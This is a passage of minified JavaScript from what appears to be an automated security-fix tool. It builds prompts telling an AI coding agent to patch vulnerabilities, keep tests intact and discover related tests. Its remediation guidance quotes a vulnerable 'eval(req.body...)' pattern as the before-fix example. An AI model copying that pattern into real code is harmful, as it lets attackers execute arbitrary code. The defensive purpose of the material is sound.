W=X.match(/process\.platform\s*===\s*["']win32["']\s*\?\s*([^:]+)\s*:\s*([^;]+)/);if(W){let G=W[1].trim(),H=W[2].trim();J=`Windows uses ${G}, Unix uses ${H}`;let $=G.match(/["']([^"']*NODE_ENV[^"']*)["']/);if($)Y=$[1]}}return{windowsSupport:Q,platformSpecificLogic:J,commandPrefixPattern:Y}}extractErrorHandling(X){let Q=[],J="No explicit error handling",Y="Unknown callback behavior";if(X.includes("try {")&&X.includes("catch"))Q.push("try-catch exceptions"),J="Uses try-catch for error handling";if(X.includes("function(err")||X.includes("(error,")){if(Q.push("callback errors"),X.includes("if (err)")||X.includes("if (error)"))if(X.includes("done()"))Y="Always call done() regardless of success/failure",J="Log errors but still call done()";else J="Handle errors in callback"}if(X.includes("stderr"))Q.push("stderr output");return{errorTypes:Q,errorHandlingPattern:J,callbackBehavior:Y}}extractLoggingBehavior(X){let Q=[],J="No explicit success logging",Y="No explicit error logging";if(X.includes("console.log"))Q.push("console.log");if(X.includes("grunt.log")){if(X.includes("grunt.log.ok")){Q.push("grunt.log.ok");let W=X.match(/grunt\.log\.ok\s*\(\s*([^)]+)\s*\)/);if(W)J=`grunt.log.ok(${W[1]})`}if(X.includes("grunt.log.error")){Q.push("grunt.log.error");let W=X.match(/grunt\.log\.error\s*\(\s*([^)]+)\s*\)/g);if(W)Y=W.join(" + ")}}return{successPattern:J,errorPattern:Y,logMethods:Q}}extractIntegrationPoints(X,Q){let J=[];if(Q==="grunt-task"){if(J.push({type:"grunt-task-system",description:"Must be compatible with grunt task runner",requirement:"Function signature must match grunt.registerTask pattern"}),X.includes("this.async()"))J.push({type:"async-callback",description:"Uses grunt async pattern with this.async()",requirement:"Must call done() to signal completion"});if(X.includes("exec(")||X.includes("execFile("))J.push({type:"process-execution",description:"Executes external processes",requirement:"Must execute external commands with proper arguments"});if(X.includes("process.platform"))J.push({type:"cross-platform",description:"Works on Windows and Unix systems",requirement:"Must handle platform-specific command syntax"})}return J}buildContractFromTestCase(X,Q){if(!X.functionUnderTest)return null;return{functionSignature:{name:X.functionUnderTest,parameters:this.inferParametersFromTest(X,Q),returnType:this.inferReturnTypeFromTest(X,Q),callbackPattern:this.extractCallbackPatternFromTest(X,Q)},environmentHandling:{defaultEnvironment:"development",environmentSources:[],precedenceOrder:[],validationLogic:"Inferred from test patterns"},platformCompatibility:{windowsSupport:!1,platformSpecificLogic:"Unknown from test",commandPrefixPattern:""},errorHandling:{errorTypes:[],errorHandlingPattern:"Unknown from test",callbackBehavior:"Unknown from test"},loggingBehavior:{successPattern:"Unknown from test",errorPattern:"Unknown from test",logMethods:[]},integrationPoints:[]}}generateFixConstraints(X){let Q=[],J=[],Y=[],W=[];for(let G of X){if(Q.push(`Function parameter names must remain "${G.functionSignature.parameters.map((H)=>H.name).join(", ")}"`),G.functionSignature.callbackPattern)Q.push(`Callback must be called as ${G.functionSignature.callbackPattern.name}(${G.functionSignature.callbackPattern.expectedArgs.join(", ")})`);if(G.environmentHandling.precedenceOrder.length>0)Q.push(`Environment precedence: ${G.environmentHandling.precedenceOrder.join(" || ")}`);if(G.platformCompatibility.windowsSupport)Q.push("Windows platform support with command prefix logic");if(G.errorHandling.callbackBehavior.includes("done()"))Q.push("Error logging using existing patterns");if(J.push("Replace vulnerable functions with secure alternatives"),J.push("Prevent injection attacks through input validation"),J.push("Validate/sanitize user input if needed"),Y.push("Replace insecure functions with secure equivalents"),Y.push("Add input sanitization within existing patterns"),Y.push("Improve error handling while preserving interface"),Y.push("Update internal implementation while preserving external behavior"),W.push("Changing function signature (parameter names/count)"),W.push("Changing callback signature or behavior"),G.platformCompatibility.windowsSupport)W.push("Removing Windows platform support");W.push("Changing environment precedence logic"),W.push("Altering integration patterns")}return{preserveRequired:[...new Set(Q)],securityRequirements:[...new Set(J)],allowedChanges:[...new Set(Y)],forbiddenChanges:[...new Set(W)]}}inferParametersFromTest(X,Q){return[]}inferReturnTypeFromTest(X,Q){return"void"}extractCallbackPatternFromTest(X,Q){return}inferReturnType(X){if(X.includes("return "))return"unknown";return"void"}}import*as R7 from"path";import*as eW from"fs/promises";class sK{testDiscovery;contractExtractor;constructor(){this.testDiscovery=new aK,this.contractExtractor=new oK}async enhanceContext(X,Q,J,Y={enabled:!0}){if(!Y.enabled)return null;let W=Date.now(),G=Y.discoveryTimeout||30000;try{V.info("[TestAware] Starting test discovery and contract extraction...");let H=await Promise.race([this.discoverRelatedTests(X,Q,J,Y),new Promise((Z,M)=>setTimeout(()=>M(Error("Test discovery timeout")),G))]),$=await this.extractBehavioralContracts(X,Q,J,H,Y),z=this.contractExtractor.generateFixConstraints($),U=this.determineTestFramework(H,J),K=await this.determineTestCommand(J,U),B={relatedTests:H,behavioralContracts:$,constraints:z,testFramework:U,testCommand:K,preserveRequirements:z.preserveRequired,securityRequirements:z.securityRequirements},q=Date.now()-W;if(V.info(`[TestAware] Enhancement completed in ${q}ms: found ${H.length} tests, ${$.length} contracts`),Y.verbose)this.logTestAwareDetails(B);return B}catch(H){let $=Date.now()-W;return V.warn(`[TestAware] Enhancement failed after ${$}ms:`,H),null}}generatePromptEnhancement(X){if(!X||X.relatedTests.length===0)return"";let Q=`

## \uD83E\uDDEA TEST-AWARE FIX GENERATION
`;if(Q+=`

`,Q+=`**CRITICAL**: The following tests and behavioral contracts MUST be preserved during your fix.

`,X.behavioralContracts.length>0){Q+=`### \uD83D\uDCCB BEHAVIORAL CONTRACTS TO PRESERVE

`;for(let J of X.behavioralContracts){if(Q+=`#### Function: ${J.functionSignature.name}

`,Q+=`**Function Signature:**
`,Q+=`- Parameters: ${J.functionSignature.parameters.map((Y)=>`${Y.name}: ${Y.type}`).join(", ")}
`,Q+=`- Return type: ${J.functionSignature.returnType}
`,J.functionSignature.callbackPattern)Q+=`- Callback: ${J.functionSignature.callbackPattern.name}(${J.functionSignature.callbackPattern.expectedArgs.join(", ")})
`,Q+=`- Callback behavior: ${J.functionSignature.callbackPattern.behavior}
`;if(Q+=`
**Environment Handling:**
`,Q+=`- Default: ${J.environmentHandling.defaultEnvironment}
`,Q+=`- Precedence: ${J.environmentHandling.precedenceOrder.join(" || ")}
`,J.platformCompatibility.windowsSupport)Q+=`
**Platform Compatibility:**
`,Q+=`- Windows support: Required
`,Q+=`- Command pattern: ${J.platformCompatibility.commandPrefixPattern}
`;Q+=`
**Error Handling:**
`,Q+=`- Pattern: ${J.errorHandling.errorHandlingPattern}
`,Q+=`- Callback behavior: ${J.errorHandling.callbackBehavior}
`,Q+=`
---

`}}Q+=`###  REQUIRED PRESERVATION CONSTRAINTS

`;for(let J of X.preserveRequirements)Q+=`-  ${J}
`;Q+=`
### \uD83D\uDD12 SECURITY REQUIREMENTS

`;for(let J of X.securityRequirements)Q+=`- \uD83D\uDD12 ${J}
`;Q+=`
###  ALLOWED CHANGES

`;for(let J of X.constraints.allowedChanges)Q+=`-  ${J}
`;Q+=`
###  FORBIDDEN CHANGES

`;for(let J of X.constraints.forbiddenChanges)Q+=`-  ${J}
`;if(X.relatedTests.length>0){Q+=`
### \uD83E\uDDEA RELATED TESTS TO CONSIDER

`,Q+=`Found ${X.relatedTests.length} test files that may be affected by your changes:

`;for(let J of X.relatedTests.slice(0,5)){if(Q+=`**${R7.basename(J.path)}** (${J.testFramework})
`,J.testCases.length>0){Q+=`- ${J.testCases.length} test cases covering behavioral expectations
`;for(let Y of J.testCases.slice(0,3))Q+=`  - "${Y.name}"
`}Q+=`
`}Q+=`**Test Command**: \`${X.testCommand}\`

`}return Q+=`### \uD83C\uDFAF TEST-AWARE FIX INSTRUCTIONS

`,Q+=`1. **BEFORE FIXING**: Read existing tests to understand expected behavior
`,Q+=`2. **DURING FIXING**: Ensure your changes preserve all behavioral contracts
`,Q+=`3. **AFTER FIXING**: Run tests to verify behavioral preservation
`,Q+=`4. **VALIDATION**: Confirm both security fix AND behavioral preservation

`,Q+=`**REMEMBER**: Your fix must be INCREMENTAL, not a comprehensive rewrite.
`,Q+=`Focus on fixing the security issue while preserving existing functionality.

`,Q}async discoverRelatedTests(X,Q,J,Y){let W=Y.testDiscoveryRoot||J,G=await this.testDiscovery.discoverTests({rootDir:W,analyzeContent:!0}),H=[];if(Q.relatedFiles&&Q.relatedFiles.length>0)for(let U of Q.relatedFiles){let K=await this.testDiscovery.findTestsForFile(U,{rootDir:W,analyzeContent:!0});H.push(...K)}let $=this.extractKeywords(X);for(let U of G)if(this.testContainsKeywords(U,$))H.push(U);return H.filter((U,K,B)=>K===B.findIndex((q)=>q.path===U.path))}async extractBehavioralContracts(X,Q,J,Y,W){let G=[];if(W.vulnerableFilePath)try{let $=await eW.readFile(R7.resolve(J,W.vulnerableFilePath),"utf-8"),z=await this.contractExtractor.extractFromVulnerableCode(W.vulnerableFilePath,$);G.push(z)}catch($){V.warn(`[TestAware] Could not read vulnerable file ${W.vulnerableFilePath}:`,$)}if(Q.relatedFiles)for(let $ of Q.relatedFiles)try{let z=R7.resolve(J,$),U=await eW.readFile(z,"utf-8"),K=await this.contractExtractor.extractFromVulnerableCode($,U);G.push(K)}catch(z){V.warn(`[TestAware] Could not read related file ${$}:`,z)}let H=this.contractExtractor.extractFromTests(Y);return G.push(...H),G}determineTestFramework(X,Q){let Y=X.map((G)=>G.testFramework).reduce((G,H)=>{return G[H]=(G[H]||0)+1,G},{}),W=Object.entries(Y).sort(([,G],[,H])=>H-G)[0];return W?W[0]:"unknown"}async determineTestCommand(X,Q){try{let J=R7.join(X,"package.json");if(JSON.parse(await eW.readFile(J,"utf-8")).scripts?.test)return"npm test";switch(Q){case"jest":return"npx jest";case"vitest":return"npx vitest run";case"mocha":return"npx mocha";case"tap":return"npx tap";default:return"npm test"}}catch(J){return"npm test"}}extractKeywords(X){let Q=[],J=X.title.toLowerCase().split(/\s+/);Q.push(...J.filter((W)=>W.length>3));let Y=X.body.toLowerCase().split(/\s+/);return Q.push(...Y.filter((W)=>W.length>4)),Q.push("security","vulnerability","injection","xss","sql","csrf"),[...new Set(Q)]}testContainsKeywords(X,Q){let J=X.content.toLowerCase();return Q.some((Y)=>J.includes(Y))}logTestAwareDetails(X){V.info("[TestAware] Detailed context:"),V.info(`- Related tests: ${X.relatedTests.length}`),V.info(`- Behavioral contracts: ${X.behavioralContracts.length}`),V.info(`- Test framework: ${X.testFramework}`),V.info(`- Test command: ${X.testCommand}`),V.info(`- Preserve requirements: ${X.preserveRequirements.length}`),V.info(`- Security requirements: ${X.securityRequirements.length}`);for(let Q of X.behavioralContracts)if(V.info(`- Contract for: ${Q.functionSignature.name}`),Q.functionSignature.callbackPattern)V.info(`  - Callback: ${Q.functionSignature.callbackPattern.behavior}`)}}var mC=$1(()=>{gC();y1()});import{execSync as g6}from"child_process";class XG{cliAdapter;testAwareEnhancement;config;repoPath;claudeConfig;constructor(X,Q=process.cwd(),J){this.config=X,this.repoPath=Q,this.claudeConfig=X.claudeCodeConfig||X.useStructuredPhases?{useStructuredPhases:X.useStructuredPhases}:void 0,this.cliAdapter=new lQ(X,Q,J),this.testAwareEnhancement=new sK}constructPrompt(X,Q,J){if(J)return J;if(this.claudeConfig?.useStructuredPhases)return this.constructStructuredPhasedPrompt(X,Q);return`You are an expert security engineer fixing vulnerabilities by directly editing files in a git repository. You have access to file editing tools and will make changes that will be committed to git.

## Issue Details:
- **Title**: ${X.title}
- **Description**: ${X.body}
- **Complexity**: ${Q.complexity}
- **Files with vulnerabilities**: ${Q.relatedFiles?.join(", ")||"To be discovered"}

## Your Task:

### Phase 1: Locate Vulnerabilities & Check Tests
- Use Grep to find vulnerable code patterns
- Use Read to understand the full context
- Search for existing tests that exercise the vulnerable code
- Identify how the vulnerable code is used (callbacks, promises, etc.)
- Consider using sequential thinking for complex vulnerability analysis

### Phase 2: Red-Green-Refactor Validation
**CRITICAL**: Before fixing, validate the vulnerability exists:
- If tests exist: Run them to establish baseline
- Create or identify a test that demonstrates the vulnerability
- Ensure this test would FAIL on vulnerable code (RED phase)
- Document what malicious input would exploit the vulnerability

### Phase 3: Fix Vulnerabilities In-Place with Compatibility

**\uD83D\uDEA8 CRITICAL REQUIREMENT - YOU MUST FOLLOW THIS EXACT ORDER:**

#### Step 3.1: EDIT FILES FIRST (MANDATORY)
**YOU MUST use the Edit or MultiEdit tools to modify files BEFORE providing JSON.**
-  DO NOT skip to JSON without editing files first
-  DO NOT provide file contents in JSON instead of editing
-  DO use Edit/MultiEdit tools to make actual file changes
-  DO wait for "File updated successfully" confirmation
-  DO make minimal, surgical changes to fix security issues

#### Step 3.2: Preserve Compatibility (WHILE EDITING)
- **PRESERVE API COMPATIBILITY**: 
  - If code uses callbacks, maintain callback interface
  - If changing from callbacks to async/await, add compatibility wrapper
  - Never break existing function signatures
- Maintain existing code style and formatting
- Fix all instances of the vulnerability

#### Step 3.3: Verify Edits Were Applied
**After using Edit/MultiEdit, confirm the files were modified:**
- You should see "File [path] has been updated" messages
- If you don't see these confirmations, the edits didn't work
- Try again with the Edit tool until you see confirmations

Example compatibility wrapper for callback to async conversion:
\`\`\`javascript
// Original method for compatibility
methodName(param1, param2, callback) {
  if (typeof callback === 'function') {
    // Callback style
    this.methodNameAsync(param1, param2)
      .then(result => callback(null, result))
      .catch(error => callback(error));
  } else {
    // Promise style
    return this.methodNameAsync(param1, param2);
  }
}

// New async implementation
async methodNameAsync(param1, param2) {
  // Secure implementation here
}
\`\`\`

### Phase 4: Verify Your Changes (GREEN phase)
- Use Read to verify your edits were applied correctly
- Ensure the code still makes sense and will function properly
- Verify the test that demonstrated the vulnerability now PASSES
- Check that legitimate use cases still work
- Ensure no breaking changes to public APIs

### Phase 5: Provide Fix Summary (ONLY AFTER EDITING FILES)

** PREREQUISITE: You MUST have already edited files with Edit/MultiEdit tools BEFORE this phase**

After you have:
1.  Used Edit/MultiEdit tools to modify files
2.  Seen "File updated successfully" confirmations
3.  Verified your changes were applied

THEN AND ONLY THEN provide a summary in this EXACT JSON format:

\`\`\`json
{
  "title": "Fix [vulnerability type] in [component]",
  "description": "Clear explanation of what was vulnerable and how you fixed it. Include the vulnerability type, severity, and impact.",
  "files": [
    {
      "path": "path/to/file.js",
      "changes": "Complete content of the fixed file after all edits have been applied (read it back with Read tool if needed)"
    }
  ],
  "tests": [
    "Description of test 1 that validates the fix",
    "Description of test 2 that ensures no regressions",
    "Description of test 3 that verifies security improvement"
  ]
}
\`\`\`

**VALIDATION CHECKLIST:**
- [ ] Did you use Edit/MultiEdit tools FIRST? (Required)
- [ ] Did you see "File updated successfully" messages? (Required)
- [ ] Are you providing the JSON AFTER editing? (Required)
- [ ] Does "changes" contain the COMPLETE file content? (Required)

**If any checkbox is unchecked, GO BACK and complete the editing phase first!**

## \uD83D\uDD34 CRITICAL - EXECUTION ORDER IS MANDATORY \uD83D\uDD34

**YOU MUST FOLLOW THIS EXACT SEQUENCE:**

1. **FIRST**: Use Edit/MultiEdit tools to modify the vulnerable files
   - You MUST see "File updated successfully" messages
   - If you don't see these, the edit didn't work - try again

2. **SECOND**: Read the files back to verify your changes were applied
   - Use the Read tool to confirm the vulnerability is fixed

3. **THIRD**: Only after steps 1 and 2, provide the JSON summary
   - Include the complete fixed file content in the "changes" field

** COMMON MISTAKES TO AVOID:**
- Skipping straight to JSON without editing files
- Putting file edits in JSON instead of using Edit tools
- Not waiting for edit confirmation before proceeding

** CORRECT BEHAVIOR:**
- Edit files  See confirmation  Read to verify  Then provide JSON

Remember: The git-based approach requires ACTUAL file modifications via Edit tools, not just JSON descriptions!
3. **Make minimal changes** - Only fix the security issue
4. **Preserve functionality** - The code must still work correctly
5. **Maintain compatibility** - NEVER break existing APIs or interfaces
6. **Validate the fix** - Demonstrate vulnerability exists and is fixed
7. **Fix all instances** - Don't leave any vulnerabilities unfixed
8. **Use relative paths** - Use paths like 'app/data/file.js' not '/app/data/file.js'

Your changes will be committed to git, so make them production-ready!`}constructStructuredPhasedPrompt(X,Q){return`You are an expert security engineer fixing vulnerabilities. You MUST complete this task in TWO distinct phases:

## \uD83D\uDEA8 CRITICAL: FOLLOW THESE PHASES IN ORDER \uD83D\uDEA8

## PHASE 1: FILE EDITING (MANDATORY - DO THIS FIRST)


### Your Task:
1. Locate the vulnerability: ${X.title}
   - Description: ${X.body}
   - Related files: ${Q.relatedFiles?.join(", ")||"To be discovered"}

2. Use Edit or MultiEdit tools to fix the vulnerable code
   - Make minimal, surgical changes
   - Preserve API compatibility
   - Fix all instances of the vulnerability

3. After editing, use Read tool to verify your changes were applied

4. Say "PHASE 1 COMPLETE: Files have been edited" when done

 IMPORTANT: You MUST complete Phase 1 before proceeding to Phase 2.
Do NOT skip directly to providing JSON.

## PHASE 2: JSON SUMMARY (ONLY AFTER PHASE 1)


Only after you've confirmed "PHASE 1 COMPLETE", provide the JSON summary:

\`\`\`json
{
  "title": "Fix [vulnerability type] in [component]",
  "description": "Clear explanation of what was vulnerable and how you fixed it",
  "files": [
    {
      "path": "path/to/edited/file.js",
      "changes": "Complete file content after your edits (read it back with Read tool if needed)"
    }
  ],
  "tests": [
    "Description of test that validates the fix",
    "Description of test that ensures no regressions"
  ]
}
\`\`\`

## Execution Checklist:
 Used Edit/MultiEdit tools
 Verified changes with Read tool  
 Stated "PHASE 1 COMPLETE"
 Provided JSON summary

Remember: Edit files FIRST, then provide JSON. Do not provide JSON without editing.`}getSpecificVulnerabilityDetails(X){if(V.info("[DEBUG] getSpecificVulnerabilityDetails called"),V.info("[DEBUG] issueContext keys:",Object.keys(X||{})),V.info("[DEBUG] specificVulnerabilities present:",!!X.specificVulnerabilities),V.info("[DEBUG] specificVulnerabilities length:",X.specificVulnerabilities?.length||0),X.specificVulnerabilities&&X.specificVulnerabilities.length>0)V.info("[DEBUG] First vulnerability:",JSON.stringify(X.specificVulnerabilities[0],null,2));if(!X.specificVulnerabilities||X.specificVulnerabilities.length===0)return V.warn("[DEBUG] No specific vulnerabilities found in issue context"),"";let Q=`
## SPECIFIC VULNERABILITIES TO FIX
`;Q+=`

`,Q+=` You MUST fix ONLY these specific issues:

`;let J={};return X.specificVulnerabilities.forEach((Y)=>{let W=Y.file||Y.path||"unknown";if(!J[W])J[W]=[];J[W].push(Y)}),V.info("[DEBUG] Vulnerabilities grouped by file:",Object.keys(J)),Object.entries(J).forEach(([Y,W])=>{Q+=`### File: ${Y}
`,W.forEach((G)=>{if(Q+=`- **Line ${G.line}**: ${G.message||G.description}
`,G.snippet||G.code)Q+=`  Code: \`${G.snippet||G.code}\`
`;if(G.remediation)Q+=`  Fix: ${G.remediation}
`}),Q+=`
`}),Q+=` DO NOT fix issues in other files
`,Q+=` DO NOT modify vendor/third-party libraries
`,Q+=` Focus ONLY on the vulnerabilities listed above

`,V.info("[DEBUG] Generated vulnerability details section length:",Q.length),Q}getVulnerabilitySpecificGuidance(X){let Q=X.title.toLowerCase(),J=X.body.toLowerCase(),Y="";if(Q.includes("insecure_deserialization")||Q.includes("eval")||Q.includes("ssjs")||Q.includes("injection")||J.includes("eval(")||J.includes("deserializing"))Y+=`
## \uD83D\uDEA8 EVAL/DESERIALIZATION FIX GUIDANCE \uD83D\uDEA8
`,Y+=`

`,Y+="**CRITICAL**: This vulnerability uses `eval()` which executes arbitrary code.\n",Y+=`The eval() function MUST be completely removed and replaced.

`,Y+=`### STEP-BY-STEP FIX INSTRUCTIONS:

`,Y+=`1. **LOCATE the eval() calls**:
`,Y+="   - Use Grep to find all instances of `eval(`\n",Y+=`   - Common locations: data parsing, calculation functions, user input handling

`,Y+=`2. **IDENTIFY what data type is expected**:
`,Y+=`   - Number (integer or decimal)?  Use parseInt() or parseFloat()
`,Y+=`   - JSON object?  Use JSON.parse()
`,Y+=`   - Mathematical expression?  Use a safe math library
`,Y+=`   - **Check for commented-out fixes in the code!**

`,Y+=`3. **REPLACE eval() using Edit tool**:

`,Y+=` **FOR NUMBERS (most common)**:
`,Y+="```javascript\n",Y+=`// GENERIC PATTERN:
`,Y+=`// BEFORE: eval(value)
`,Y+=`// AFTER:  parseInt(value, 10)

`,Y+=`// BEFORE (VULNERABLE):
`,Y+=`const preTax = eval(req.body.preTax);
`,Y+=`const afterTax = eval(req.body.afterTax);
`,Y+=`const roth = eval(req.body.roth);

`,Y+=`// AFTER (FIXED):
`,Y+=`const preTax = parseInt(req.body.preTax, 10);
`,Y+=`const afterTax = parseInt(req.body.afterTax, 10);
`,Y+=`const roth = parseInt(req.body.roth, 10);
`,Y+="```\n\n",Y+=` **FOR DECIMAL NUMBERS**:
`,Y+="```javascript\n",Y+=`// BEFORE: const price = eval(userInput);
`,Y+=`// AFTER:  const price = parseFloat(userInput);
`,Y+="```\n\n",Y+=` **FOR JSON DATA**:
`,Y+="```javascript\n",Y+=`// BEFORE: const data = eval("(" + userInput + ")");
`,Y+=`// AFTER:  const data = JSON.parse(userInput);
`,Y+="```\n\n",Y+=` **THESE DO NOT FIX THE VULNERABILITY**:
`,Y+=`- Input validation before eval() (still executes code)
`,Y+=`- Sanitizing or escaping input (can be bypassed)
`,Y+=`- Using new Function() (also executes arbitrary code)
`,Y+=`- Wrapping eval() in try-catch (still allows code execution)

`,Y+=`4. **VERIFY the fix**:
`,Y+=`   - Use Read tool to confirm eval() is completely removed
`,Y+=`   - Ensure ALL instances are replaced
`,Y+=`   - Run the RED tests - they should PASS after fix

`,Y+=`### EXAMPLE COMPLETE FIX:

`,Y+=`If you see code like this:
`,Y+="```javascript\n",Y+=`const preTax = eval(req.body.preTax);    // Line 32
`,Y+=`const afterTax = eval(req.body.afterTax);  // Line 33
`,Y+=`const roth = eval(req.body.roth);      // Line 34
`,Y+="```\n\n",Y+=`Use the Edit tool to replace it with:
`,Y+="```javascript\n",Y+=`const preTax = parseInt(req.body.preTax, 10);    // Line 32
`,Y+=`const afterTax = parseInt(req.body.afterTax, 10);  // Line 33
`,Y+=`const roth = parseInt(req.body.roth, 10);      // Line 34
`,Y+="```\n\n",Y+=`**IMPORTANT NOTES**:
`,Y+=`- parseInt() safely converts strings to integers
`,Y+=`- The second parameter (10) specifies base-10 numbers
`,Y+=`- This completely prevents code execution
`,Y+=`- Maintains the same API - no breaking changes
`,Y+=`- Invalid input returns NaN (handled by existing validation)

`;return Y}async constructPromptWithTestContext(X,Q,J,Y,W){V.info("[DEBUG] constructPromptWithTestContext called"),V.info("[DEBUG] Issue context:",{hasTitle:!!X.title,hasBody:!!X.body,hasSpecificVulnerabilities:!!X.specificVulnerabilities,vulnerabilityCount:X.specificVulnerabilities?.length||0});let G=`You are an expert security engineer fixing vulnerabilities.

## \uD83D\uDEA8 CRITICAL CONSTRAINTS - READ FIRST \uD83D\uDEA8


1. **NEVER MODIFY TEST FILES** - You must NEVER edit files in test/, spec/, or __tests__ directories
2. **NEVER BYPASS TESTS** - Do not change test code to make tests pass
3. **ONLY FIX IMPLEMENTATION** - Only modify the actual vulnerable code files
4. **If a test fails, fix the IMPLEMENTATION, not the test**
5. **Test files are READ-ONLY** - You may read them to understand requirements
6. **DO NOT modify vendor/third-party libraries** unless the vulnerability is specifically there

${this.getSpecificVulnerabilityDetails(X)}

## TEST EXECUTION CAPABILITY


You can run tests to verify your fix works:

\`\`\`bash
# Run all tests
npm test

# Run specific test file
npm test -- path/to/test.js

# Check if your changes fixed the vulnerability
npm test -- --grep "security"
\`\`\`

**IMPORTANT**:
- Use the Bash tool to run tests
- If tests fail, read the error output
- Adjust your fix based on test feedback
- You have 3 attempts to get tests passing
- DO NOT modify the tests to make them pass

${this.getVulnerabilitySpecificGuidance(X)}

`;try{let H=await this.testAwareEnhancement.enhanceContext(X,Q,this.repoPath,{enabled:!0,vulnerableFilePath:Q.relatedFiles?.[0],testDiscoveryRoot:this.repoPath,discoveryTimeout:30000,includeTestContent:!0,verbose:process.env.RSOLV_DEBUG_CONVERSATION==="true"});if(H){let $=this.testAwareEnhancement.generatePromptEnhancement(H);G+=$,V.info("[TestAware] Successfully added test-aware context to prompt")}else V.info("[TestAware] No test-aware context available, continuing without enhancement")}catch(H){V.warn("[TestAware] Failed to enhance prompt with test awareness:",H)}if(G+=this.constructPrompt(X,Q),J?.generatedTests?.success)G+=`

## Generated Tests
`,G+=`The following tests have been generated to validate your fix:

`,J.generatedTests.tests.forEach((H)=>{G+=`### ${H.framework} Test
`,G+="```"+(H.framework==="rspec"?"ruby":"javascript")+`
`,G+=H.testCode,G+="\n```\n\n"}),G+=`**IMPORTANT**: Your fix must make these tests pass!
`,G+=`- RED test should fail before your fix
`,G+=`- GREEN test should pass after your fix
`,G+=`- REFACTOR test should ensure functionality is maintained
`;if(Y&&!Y.success){if(G+=`

## Previous Fix Attempt Failed
`,G+=`This is attempt ${W?.current||2} of ${W?.max||3}.

`,G+=`### Test Results:
`,G+="```\n",G+=`Vulnerable commit - RED tests: ${Y.vulnerableCommit.allPassed?"PASSED (unexpected!)":"FAILED (expected)"}
`,G+=`Fixed commit - RED tests: ${Y.fixedCommit.allPassed?"PASSED (expected)":"FAILED (problem!)"}
`,Y.fixedCommit.redTestsPassed&&Y.fixedCommit.redTestsPassed.length>1)G+=`
Individual RED test results on fixed code:
`,Y.fixedCommit.redTestsPassed.forEach((H,$)=>{G+=`  - RED test ${$+1}: ${H?"PASSED":"FAILED"}
`});if(G+="\n```\n\n",!Y.fixedCommit.allPassed)G+=`- **The vulnerability still exists** - RED tests are still failing on your fixed code
`,G+=`- This means your fix did not properly address the security issue
`;if(Y.vulnerableCommit.allPassed)G+=`- **Warning**: RED tests passed on vulnerable code (they should fail!)
`,G+=`- This suggests the tests may not be properly detecting the vulnerability
`;G+=`
**Please analyze the test failures and try a different approach.**
`,G+=`Consider:
`,G+=`- Are you handling all edge cases?
`,G+=`- Is the fix too restrictive or breaking functionality?
`,G+=`- Do you need to adjust the implementation strategy?
`,G+=`- Review the RED test expectations and attack vectors
`}if(W){if(G+=`

## Iteration Context
`,G+=`You have ${W.max-W.current} attempts remaining.
`,W.current===W.max)G+=`**This is your final attempt.** Ensure the fix is comprehensive.
`}return G+=`

## Test Validation Instructions
`,G+=`1. After implementing your fix, explain how to run the tests
`,G+=`2. Specify which test framework is being used
`,G+="3. Include the test command (e.g., `bundle exec rspec` or `npm test`)\n",G+=`4. Ensure all security tests pass before considering the fix complete
`,G}parsePhaseCompletion(X=[]){let Q=!1,J=!1,Y=!1;for(let W of X){if(W.type==="text"&&W.text){if(W.text.includes("PHASE 1 COMPLETE"))Q=!0;if(W.text.includes("```json"))Y=!0}if(W.type==="assistant"&&W.message?.content){for(let G of W.message.content)if(G.type==="text"&&G.text){if(G.text.includes("PHASE 1 COMPLETE"))Q=!0;if(G.text.includes("```json"))Y=!0}}if(W.type==="tool_use"){if(W.name==="Edit"||W.name==="MultiEdit")J=!0}if(W.type==="assistant"&&W.message?.content){for(let G of W.message.content)if(G.type==="tool_use"){if(G.name==="Edit"||G.name==="MultiEdit")J=!0}}}return{phase1Complete:Q,filesEdited:J,jsonProvided:Y,success:Q&&J&&Y}}async generateSolutionWithGit(X,Q,J,Y,W,G){let H=Date.now();try{let $=this.getModifiedFiles();if($.length>0)V.warn(`Repository has uncommitted changes: ${$.join(", ")}`);V.info("Executing Claude Code to fix vulnerabilities in-place..."),V.info("[DEBUG] About to construct prompt:",{hasTestResults:!!Y,hasValidationResult:!!W,hasIteration:!!G,issueContextKeys:Object.keys(X),hasSpecificVulnerabilities:!!X.specificVulnerabilities});let z=Y||W||G?await this.constructPromptWithTestContext(X,Q,Y,W,G):J;if(z){if(V.info("[DEBUG] Prompt includes SPECIFIC VULNERABILITIES:",z.includes("SPECIFIC VULNERABILITIES TO FIX")),z.includes("SPECIFIC VULNERABILITIES TO FIX")){let L=z.indexOf("SPECIFIC VULNERABILITIES TO FIX"),R=Math.min(L+1000,z.length);V.info("[DEBUG] Vulnerability section:",z.substring(L,R))}}V.info("Using Claude Code CLI adapter for file editing...");let U=await this.cliAdapter.generateSolution(X,Q,z);if(process.env.RSOLV_DEBUG_CONVERSATION==="true"){if(V.warn("  DEBUG MODE: Conversation logging enabled - DO NOT USE IN PRODUCTION"),U.messages)V.info("=== CLAUDE CODE CONVERSATION START ==="),U.messages.forEach((L,R)=>{if(V.info(`Message ${R+1} (${L.type}):`),L.type==="text"&&L.text){let j=L.text.length>500?L.text.substring(0,500)+"...[truncated]":L.text;V.info(`  Text: ${j}`)}else if(L.type==="tool_use"){if(V.info(`  Tool: ${L.name}`),L.input?.path||L.input?.file_path)V.info(`  File: ${L.input.path||L.input.file_path}`);if(L.input?.old_string)V.info(`  Editing: ${L.input.old_string.substring(0,100)}...`)}else if(L.type==="assistant"&&L.message?.content)V.info(`  Assistant message with ${L.message.content.length} content items`)}),V.info("=== CLAUDE CODE CONVERSATION END ===")}if(!U.success)return{success:!1,message:U.message,error:U.error};let K=this.getModifiedFiles();if(process.env.RSOLV_DEBUG_CONVERSATION==="true")try{let L=g6("git status --porcelain",{cwd:this.repoPath,encoding:"utf8"});V.info(`Git status output: ${L||"(no changes)"}`);let R=g6("pwd",{cwd:this.repoPath,encoding:"utf8"}).trim();V.info(`Working directory: ${R}`);let j=g6("ls -la",{cwd:this.repoPath,encoding:"utf8"});V.info(`Files in directory:
